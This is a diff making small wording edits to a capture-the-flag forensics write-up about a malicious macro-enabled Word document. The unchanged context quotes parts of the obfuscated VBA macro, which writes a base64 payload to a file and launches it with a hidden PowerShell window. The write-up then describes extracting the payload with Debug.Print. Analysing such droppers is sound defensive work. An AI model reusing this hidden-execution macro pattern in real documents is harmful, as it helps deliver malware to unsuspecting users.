@@ -1,6 +1,6 @@
 # [Forensics] Halloween invitation
 
-The challenge starts with a Macro Word Document `.docm`. The macro contains obfuscated code that writes the base64 encoded payload into a file, then read the payload from that file to execute it via powershell:
+The challenge starts with a Macro Word Document `.docm`. The macro contains obfuscated code that writes a base64 encoded payload into a file, then reads the payload from that file to execute it via powershell:
 
 ```vba
 Set dfdjqgaqhvxxi = rxnnvnfqufrzqfhnff.CreateTextFile(dropPath & uxdufnkjlialsyp("5c68697374") & uxdufnkjlialsyp("6f72792e62616b"), True)
@@ -13,7 +13,7 @@ Code = "powershell -WindowStyle hidden -e """ & secret
 x = Shell(Code, 1)
 ```
 
-For us to get the b64 encoded payload, we can comment the Write/Read/Execution part of the macro and use `Debug.Print` to read the payload that was about to be written.
+For us to get the b64 encoded payload, we can comment the Write/Read/Execution part of the macro and use `Debug.Print` to read the payload that was supposed to be written.
 
 We obtain:
 
